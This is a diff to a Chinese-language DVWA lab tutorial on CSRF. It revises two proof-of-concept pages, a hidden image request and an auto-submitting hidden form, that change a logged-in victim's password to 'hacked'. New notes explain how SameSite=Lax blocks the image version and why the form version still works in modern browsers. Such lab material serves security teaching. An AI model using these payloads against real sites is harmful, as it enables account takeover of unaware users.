@@ -59,24 +59,34 @@ http://靶机IP/dvwa/vulnerabilities/csrf/?password_new=123456&password_conf=123
 
 ```html
 <!DOCTYPE html>
-<html>
+<html lang="zh-CN">
 <head>
+    <meta charset="utf-8">
     <title>CSRF Low PoC</title>
 </head>
 <body>
-    <h1>正在加载...</h1>
-    <img src="http://靶机IP/dvwa/vulnerabilities/csrf/?password_new=hacked&password_conf=hacked&Change=Change" style="display:none;">
+    <p>正在加载…</p>
+    <img src="http://靶机IP/dvwa/vulnerabilities/csrf/?password_new=hacked&amp;password_conf=hacked&amp;Change=Change" style="display:none;">
 </body>
 </html>
 ```
 
-原理：`<img>` 标签的 `src` 会自动发起 GET 请求。由于受害者浏览器中保存着 DVWA 的会话 Cookie，请求会携带该 Cookie，服务器认为这是合法操作，从而将密码修改为 `hacked`。
+原理：`<img>` 的 `src` 会自动发起 GET 请求，浏览器认为这是在加载图片，不弹窗也不跳转，受害者只会看到页面上「正在加载…」这行字。
+
+> **两个注意点**
+>
+> 1. `<head>` 里必须写 `<meta charset="utf-8">`，文件也要按 UTF-8 保存，否则浏览器会按 GBK 解码，页面上的「正在加载…」会显示成乱码。
+> 2. **SameSite 会拦这一招**：Chrome 80 起 Cookie 默认 `SameSite=Lax`，跨站的子资源请求（`img` / `script` / `iframe`）不带 Cookie，所以 `<img>` 版本在现在的 Chrome 上大多改不了密码（Firefox 或 `SameSite=None` 的老环境才行）。下面用表单提交更可靠。
 
 也可以使用隐藏表单自动提交：
 
 ```html
 <!DOCTYPE html>
-<html>
+<html lang="zh-CN">
+<head>
+    <meta charset="utf-8">
+    <title>CSRF Low PoC</title>
+</head>
 <body onload="document.csrf_form.submit()">
     <form name="csrf_form" action="http://靶机IP/dvwa/vulnerabilities/csrf/" method="GET">
         <input type="hidden" name="password_new" value="hacked">
@@ -86,6 +96,8 @@ http://靶机IP/dvwa/vulnerabilities/csrf/?password_new=123456&password_conf=123
 </body>
 </html>
 ```
+
+表单提交属于**顶级导航**，`SameSite=Lax` 允许顶级 GET 导航携带 Cookie，所以在现代浏览器里表单版能打通、`<img>` 版大概率不行——这也是本地复现时最容易踩的坑。
 
 ### 3. 诱导受害者访问
 
